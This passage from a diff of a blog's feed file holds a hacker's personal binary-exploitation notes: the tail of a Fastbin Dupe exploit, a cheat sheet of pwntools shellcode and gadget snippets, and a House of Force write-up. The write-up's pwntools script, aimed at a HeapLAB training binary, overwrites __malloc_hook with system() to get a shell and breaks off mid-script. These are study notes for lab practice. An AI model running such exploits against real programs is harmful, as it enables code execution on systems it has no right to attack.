-    &lt;span class=&quot;n&quot;&gt;lg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'malloc_hook: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;malloc_hook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;lg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'One_gadget: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;one_gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;elf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;pause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;sl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;ru&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;lg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>MiloTruck</name></author><category term="Binary Exploitation" /><category term="Heap" /><summary type="html">Fastbin Dupe</summary></entry><entry><title type="html">Binary Exploitation Notes</title><link href="http://localhost:4000/Binary-Exploitation/" rel="alternate" type="text/html" title="Binary Exploitation Notes" /><published>2020-12-17T00:00:00+08:00</published><updated>2020-12-17T00:00:00+08:00</updated><id>http://localhost:4000/Binary%20Exploitation</id><content type="html" xml:base="http://localhost:4000/Binary-Exploitation/">&lt;h2 id=&quot;general-notes&quot;&gt;General Notes&lt;/h2&gt;
-&lt;p&gt;&lt;strong&gt;Calling Convention&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;64-bit: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi, rsi, rdx, rcx, r8, r9&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;strong&gt;ret2syscall&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;64-bit: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax = 59, rdi = /bin/sh, rsi = 0, rdx = 0&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;32-bit: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eax = 11, ebx = /bin/sh, ecx = 0, edx = 0&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md&quot;&gt;Syscall Table&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;strong&gt;pwntools&lt;/strong&gt;&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Item&lt;/th&gt;
-      &lt;th&gt;Code&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;Shellcode&lt;/td&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shellcode = asm(shellcraft.sh())&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;Strings&lt;/td&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;binsh = libc.search('/bin/sh\x00;).next()&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;Gadgets&lt;/td&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gadget = exe.search(asm('pop rdi; ret')).next()&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;Address of Section&lt;/td&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data = exe.get_section_by_name('.data').header.sh_addr&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;h2 id=&quot;rop-techniques&quot;&gt;ROP Techniques&lt;/h2&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;/ret2stack/&quot;&gt;ret2stack&lt;/a&gt;: Making the stack executable&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html?m=1&quot;&gt;ret2csu&lt;/a&gt;: Lack of gadgets in 64-bit&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;heap-techniques&quot;&gt;Heap Techniques&lt;/h2&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;/House-of-Force/&quot;&gt;House of Force&lt;/a&gt;: Exploiting Top Chunk header to gain nearly-arbitrary write primitive&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;/Fastbin-Dupe/&quot;&gt;Fastbin Dupe&lt;/a&gt;: Tricking malloc into returning an already-allocated heap pointer by abusing the fastbin freelist.&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;/Unsafe-Unlink/&quot;&gt;Unsafe Unlink&lt;/a&gt;: Exploiting free on a corrupted chunk to get arbitrary write.&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>MiloTruck</name></author><category term="Binary Exploitation" /><summary type="html">Notes for Binary Exploitation</summary></entry><entry><title type="html">House of Force</title><link href="http://localhost:4000/House-of-Force/" rel="alternate" type="text/html" title="House of Force" /><published>2020-12-17T00:00:00+08:00</published><updated>2020-12-17T00:00:00+08:00</updated><id>http://localhost:4000/House%20of%20Force</id><content type="html" xml:base="http://localhost:4000/House-of-Force/">&lt;p&gt;Exploiting Top Chunk header to gain nearly-arbitrary write primitive.&lt;/p&gt;
-
-&lt;h2 id=&quot;requirements&quot;&gt;Requirements&lt;/h2&gt;
-&lt;ul&gt;
-  &lt;li&gt;Control of top chunk size, usually through heap overflow&lt;/li&gt;
-  &lt;li&gt;Full control of size of allocated chunks&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;process&quot;&gt;Process&lt;/h2&gt;
-&lt;h3 id=&quot;arbitrary-write-primitive&quot;&gt;Arbitrary Write Primitive&lt;/h3&gt;
-&lt;ul&gt;
-  &lt;li&gt;Overwrite size of top chunk to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xffffffffffffffff&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Allocate chunk with size of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;offset&lt;/code&gt;, using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malloc()&lt;/code&gt;
-    &lt;ul&gt;
-      &lt;li&gt;If &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target &amp;lt; top_chunk&lt;/code&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;offset = top_chunk - target + allocated_chunks_size&lt;/code&gt;, and offset is negative&lt;/li&gt;
-      &lt;li&gt;If &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target &amp;gt; top_chunk&lt;/code&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;offset = target - top_chunk - allocated_chunks_size&lt;/code&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Allocate new chunk, this chunk will be created at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;gaining-rce-using-ret2libc&quot;&gt;Gaining RCE using ret2libc&lt;/h3&gt;
-&lt;p&gt;&lt;em&gt;This requires libc version to be known&lt;/em&gt;&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;Overwrite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__malloc_hook&lt;/code&gt; using write primitive with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system()&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malloc(/bin/sh)&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;example-heaplab-house-of-force&quot;&gt;Example: HeapLAB House of Force&lt;/h2&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;&quot;elf&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;./house_of_force&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;&quot;libc&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;./libc-2.28.so&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;&quot;ld&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;./ld.so.2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'size:'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'data:'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;c1&quot;&gt;# Get addresses
-&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;ru&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'puts() @ '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;ru&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'heap @ '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;heap_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    
-    &lt;span class=&quot;c1&quot;&gt;# Calculate libc_base, etc...
-&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'puts'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;malloc_hook&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'__malloc_hook'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'system'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;binsh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/bin/sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;lg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'heap_addr: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;lg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'malloc_hook: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;malloc_hook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;lg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'system: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;lg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'binsh: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binsh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-    
-    &lt;span class=&quot;c1&quot;&gt;# House of Force: Overwrite top_chunk size
-&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/bin/sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xffffffffffffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-    
-    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
-    # Overwrite target with &quot;OVERWRIT&quot;
-    target = elf.symbols['target']
-    top_chunk = heap_addr + 0x20
-    offset = top_chunk - target + 32
-    ru('&amp;gt;')
-    malloc(-offset, p64(0xdeadbeef))
-    malloc(16, 'OVERWRIT')
-    sla('&amp;gt;', '2')
-    &quot;&quot;&quot;&lt;/span&gt;
-
-    &lt;span class=&quot;c1&quot;&gt;# Pop shell with ret2libc by overwriting __malloc_hook with system() 
-&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;top_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc_hook&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;top_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;ru&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Y&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
-    &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'size:'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binsh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-
